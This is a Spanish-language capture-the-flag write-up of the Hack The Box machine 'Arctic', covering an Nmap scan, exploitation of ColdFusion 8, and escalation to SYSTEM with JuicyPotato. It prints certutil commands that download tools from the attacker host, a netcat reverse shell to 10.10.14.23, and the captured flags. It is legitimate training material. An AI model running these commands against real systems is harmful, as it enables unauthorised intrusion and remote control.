---
title: Arctic WriteUp
date: 2024-02-19
categories: [WriteUps, Máquinas Windows]
tags: [CVE, Reverse Shell]
image:
  path: ../../assets/img/writeups/Arctic/arctic.png
  width: 528
  height: 340
  alt: Banner Arctic
---

¡Hola!, la máquina de hoy tiene el servicio ColdFusion con una versión vulnerable, la explotamos gracias a un script a medida para la máquina. Una vez dentro del objetivo abusamos del privilegio SeImpersonatePrivilege, que está habilitado, usando el juicypotato.

## Reconocimiento

¡Buenos dias, buenas tardes, buenas noches!, hoy empezaré -ya que no suelo acabarlas el mismo día, pero si en el mismo post- con la máquina **Arctic** la IP de esta caja es la **10.10.10.11**.

Primero comprobaré que tenemos conexión a la box -recuerda que hay que conectarse a la VPN proporcionada por Hack The Box mediante el comando `openvpn <namevpn>.ovpn`-, para ello lanzaré un ping a la IP:

```sh
❯ ping -c 1 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=39.1 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.050/39.050/39.050/0.000 ms
```

El **ttl** es cercano a **128** con lo que estamos seguramente ante una máquina `Windows`.

Realizamos el escaneo de puertos a esa IP -los puertos son los puntos de entrada por donde primeramente hago reconocimiento y busco después vulnerabilidades-.

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oN ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-19 10:18 CET
Initiating SYN Stealth Scan at 10:18
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 10:19, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.038s latency).
Scanned at 2024-02-19 10:18:44 CET for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

| Options | Description |
| --- | --- |
| **-p** | Escanea todos los puertos. Hay un total de 65535 puertos |
| **-sS** | Realiza un TCP SYN Scan |
| **--min-rate** | Para enviar paquetes no más lentos que, en este caso, 5000 paquetes por segundo |
| **-n** | Para no aplicar resolución DNS |
| **-Pn** | Para que no haga host discovery |
| **-vvv** | Muestra la información en pantalla mientras se realiza el escaneo |
| **-oN** | Output se guardará en el formato Nmap |

Tenemos los siguientes puertos abiertos; **135**, **8500**, **49154**. Haré un escaner con una serie de script por defecto (**-sC**) y versiones (**-sV**) a esos puertos:

```sh
❯ nmap 10.10.10.11 -p135,8500,49154 -sC -sV -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-19 10:22 CET
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 10:25 (0:00:59 remaining)
Nmap scan report for 10.10.10.11
Host is up (0.039s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.88 seconds
```

Pues no ha sacado demasiada info. Tenemos dos servicios distintos; **msrpc** que está en dos puertos, y **fmtp** que está en el 8500. ¿Qué son estos servicios?.

- La llamada a procedimiento remoto de Microsoft/**Microsoft Remote Procedure Call**, también conocida como llamada a función o llamada a subrutina, es un protocolo que utiliza el modelo cliente-servidor que permite a un programa solicitar un servicio de un programa en otra computadora, sin tener que comprender los detalles del proceso de esa computadora.  
El objetivo de MSRPC es simplificar la comunicación entre procesos entre clientes y servidores, **permitiendo a un cliente llamar a un servicio en un servidor remoto con una interfaz estándar (en lugar de un protocolo personalizado)**.

- Parece que oficialmente **fmtp** es *Flight Message Transfer*, pero no oficialmente el puerto 8500 se utiliza comúnmente para aplicaciones y servicios basados en web, como **Adobe ColdFusion Server**, una plataforma de desarrollo que permite a los desarrolladores crear y entregar aplicaciones basadas en web. También se puede utilizar para otros servidores web, como Apache Tomcat.

Para más información sobre msrpc tenemos esta página de [hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/135-pentesting-msrpc).

## Buscando vulnerabilidades

Si abro el navegador e intento acceder al puerto 8500 de esa IP; `http://10.10.10.11`, le cuesta un poco pero parece que tengo directory listing. Y en `http://10.10.10.11:8500/CFIDE/administrator/` llego a una panel de inicio de sesión. Parece que estamos ante un `Adobe ColdFusion 8`.

![ColdFusion]({{ 'assets/img/writeups/Arctic/coldfusion.png' | relative_url }}){: .center-image }

Buscaré credenciales por defecto y vulnerabilidades asociadas.

```sh
❯ searchsploit coldfusion 8
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                   | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                   | multiple/remote/16985.rb
... SNIP ....
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                    | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                   | cfm/webapps/50057.py
... SNIP ....
```

Además si busco por internet **adobe coldfusion 8 exploit** encuentro una primera entrada en la página **exploit-db** -el comando searchsploit recoge los exploits de esta página-. Corresponde al EDB-ID: 50057, es decir, el mismo del bloque de arriba (del RCE).  
Parece un script creado especificamente para esta máquina, ya que el propio script en python lleva la IP objetivo de Arctic. Cambio la IP local - a la mía- y lanzo el exploit:

```sh
❯ python3 coldfusion.py

Generating a payload...
Payload size: 1497 bytes
Saved as: a7c55f029b324c3686507e5a1876b043.jsp

Priting request...
Content-type: multipart/form-data; boundary=3d7e25ded00e46f7b6149de9af887ec2
Content-length: 1698
... SNIP ....

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```

Parece que estoy dentro!!. Voy al directorio de tolis en `\Users\tolis\Desktop` y consigo la primera flag:

```sh
C:\Users\tolis\Desktop>type user.txt
type user.txt
f9719fa8c85adca6fe0b234ccfe21208

C:\Users\tolis\Desktop>
```

## Escalada de privilegios

Miro el sistema de archivos pero no veo nada interesante, lanzaré el comando `systeminfo` para recoger información del sistema y lo pasaré a la herramienta **Windows-Exploit-Suggester**.

```powershell
C:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          20/2/2024, 7:06:31 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
... SNIP ....
```

Nos copiamos el output del comando `systeminfo` en el archivo **sysinfo** por ejemplo. Y actualizo la base de datos del programa -desde julio del 2023 ya no se ha actualizado ni se actualizará más-. Esta herramienta, Windows-Exploit-Suggester, se usa con **python2.7**. 

```sh
❯ python2.7 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2024-02-19-mssb.xls
[*] done

❯ ls
 2024-02-19-mssb.xls   LICENSE.md   README.md   sysinfo   windows-exploit-suggester.py
```

Y ahora lanzamos la herramienta:

```sh
❯ python2.7 windows-exploit-suggester.py --database 2024-02-19-mssb.xls --systeminfo sysinfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[-] please install and upgrade the python-xlrd library
```
Me piden que instala la libreria python-xlrd. Si no tienes el pip2.7 como era mi caso tienes que instalarlo. Pero se convertirá en el pip por defecto y tendrás que solucionarlo, lo explico:

### Inciso sobre manejo de Python.

```sh
❯ pip --version
pip 23.3.2 from /usr/local/lib/python3.9/dist-packages/pip (python 3.9)

# Instalamos el pip2.7:

❯ curl https://boostrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1863k  100 1863k    0     0  18.5M      0 --:--:-- --:--:-- --:--:-- 18.5M
❯ ls
 2024-02-19-mssb.xls   get-pip.py   LICENSE.md   README.md   sysinfo   windows-exploit-suggester.py
❯ python2.7 get-pip.py
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pip<21.0
  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
     |████████████████████████████████| 1.5 MB 6.4 MB/s 
Collecting setuptools<45
  Downloading setuptools-44.1.1-py2.py3-none-any.whl (583 kB)
     |████████████████████████████████| 583 kB 219.2 MB/s 
Collecting wheel
  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)
Installing collected packages: pip, setuptools, wheel
Successfully installed pip-20.3.4 setuptools-44.1.1 wheel-0.37.1

# Parece que al instalarlo nos quedamos con esa versión del pip por defecto:
❯ pip --version
pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)
```

Para dejar ahora el 3.9 por defecto:

```sh
❯ pip3.9 --version
pip 23.3.2 from /usr/local/lib/python3.9/dist-packages/pip (python 3.9)
❯ which pip3.9
/usr/local/bin/pip3.9
❯ pip --version
pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)
❯ which pip
/usr/local/bin/pip

❯ sudo update-alternatives --install /usr/local/bin/pip pip /usr/local/bin/pip3.9 1
update-alternatives: renaming pip link from /usr/bin/pip to /usr/local/bin/pip

❯ pip --version
pip 23.3.2 from /usr/local/lib/python3.9/dist-packages/pip (python 3.9)
```

Si quisiera volver al pip2.7:

```sh
❯ sudo update-alternatives --install /usr/local/bin/pip pip /usr/local/bin/pip2.7 2
update-alternatives: utilizando /usr/local/bin/pip2.7 para proveer /usr/local/bin/pip (pip) en modo automático
❯ pip --version
pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)
```

Y una vez configuradas dos prioridades puedo cambiar entre ellas con este comando:

```sh
❯ sudo update-alternatives --config pip

Existen 2 opciones para la alternativa pip (que provee /usr/local/bin/pip).

  Selección   Ruta                   Prioridad  Estado
------------------------------------------------------------
* 0            /usr/local/bin/pip2.7   2         modo automático
  1            /usr/local/bin/pip2.7   2         modo manual
  2            /usr/local/bin/pip3.9   1         modo manual

Pulse <Intro> para mantener el valor por omisión [*] o pulse un número de selección:
```

Y das al número que quieras hacer el pip. Aunque salga 2.7 como automático uno vez que eliges uno se queda ese, aunque apagues y enciendas el sistema (al menos a mi).

**Bueno.. seguimos con la máquina**, nos pedía instalar la librería python-xlrd.

```sh
❯ pip2.7 install xlrd
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting xlrd
  Downloading xlrd-2.0.1-py2.py3-none-any.whl (96 kB)
     |████████████████████████████████| 96 kB 6.5 MB/s 
Installing collected packages: xlrd
Successfully installed xlrd-2.0.1
```
Y ahora si, ejecutamos el script:

```sh
❯ python2.7 windows-exploit-suggester.py --database 2024-02-19-mssb.xls --systeminfo sysinfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
Traceback (most recent call last):
  File "windows-exploit-suggester.py", line 1639, in <module>
    main()
  File "windows-exploit-suggester.py", line 414, in main
    wb = xlrd.open_workbook(ARGS.database)
  File "/usr/local/lib/python2.7/dist-packages/xlrd/__init__.py", line 170, in open_workbook
    raise XLRDError(FILE_FORMAT_DESCRIPTIONS[file_format]+'; not supported')
xlrd.biffh.XLRDError: Excel xlsx file; not supported
```

Buscando el fallo en el mismo repositorio que en el script nos dicen esto:

```plaintext
The latest version of xlrd is not working fine with this tool

Instead, we have to install an old version of xlrd

pip2 uninstall xlrd
pip2 install xlrd==1.2.0
```
Hago lo de arriba y ahora espero que si vaya bien:

```sh
❯ python2.7 windows-exploit-suggester.py --database 2024-02-19-mssb.xls --systeminfo sysinfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Hay muuuchos. Podríamos optar por el que mejor documentación tenga, repositorios en github, etc. Peeero voy hacer otra cosa, un comando básico de los primeros a realizar cuando entras a un sistema windows; `whoami /priv`.

### SeImpersonatePrivilege Vulnerability

```powershell
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\ColdFusion8\runtime\bin>
```

Tenemos el SeImpersonatePrivilege habilitado así que podemos tirar del llamado **juicypotato**. En github lo encuentras, por [aquí](https://github.com/ohpe/juicy-potato). Te vas a **Fresh Potatoes** y descargas el **JuicyPotato.exe**.  
También necesitamos descargarnos el netcat para Windows, yo uso esta [página](https://eternallybored.org/misc/netcat/). Descargamos la segunda, la 1.12, porque la primera dicen que no ha sido testeada en 64 bits y si haces un systeminfo en máquina Arctic verás que es de 64bits. Se descarga un .zip. En mi carpeta local de **Recursos** haré un `unzip netcat.zip -d netcat`. Al nc64.exe lo renombro nc.exe a secas.

Comparto un server en python en el directorio donde tengo el juicy y el nc.exe:

```sh
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y en Arctic:

```powershell
C:\ColdFusion8\runtime\bin>cd C:\Windows\Temp
cd C:\Windows\Temp

C:\Windows\Temp>mkdir Privesc
mkdir Privesc

C:\Windows\Temp>certutil.exe -f -urlcache -split http://10.10.14.23:8000/JuicyPotato.exe
certutil.exe -f -urlcache -split http://10.10.14.23:8000/JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp>certutil.exe -f -urlcache -split http://10.10.14.23:8000/nc.exe
certutil.exe -f -urlcache -split http://10.10.14.23:8000/nc.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

Nos ponemos en escucha en local `nc -nlvp 4646` y lanzamos el juicypotato en remoto:

```powershell
C:\Windows\Temp\Privesc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Windows\Temp\Privesc

21/02/2024  06:06     <DIR>          .
21/02/2024  06:06     <DIR>          ..
21/02/2024  06:06            347.648 JuicyPotato.exe
21/02/2024  06:06             45.272 nc.exe
               2 File(s)        392.920 bytes
               2 Dir(s)   1.415.892.992 bytes free

C:\Windows\Temp\Privesc>.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.23 4646"
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.23 4646"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Estando en escucha recibimos la reverse shell:

```sh
❯ nc -nlvp 4646
listening on [any] 4646 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.11] 51885
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Vamos a C:\Users\Administrator\Desktop y encontraremos la flag:

```powershell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Users\Administrator\Desktop

22/03/2017  09:02     <DIR>          .
22/03/2017  09:02     <DIR>          ..
20/02/2024  07:07                 34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.415.876.608 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
8e303daeb90625885b8dedb3624dfd12
```

Y fiiiinn!.











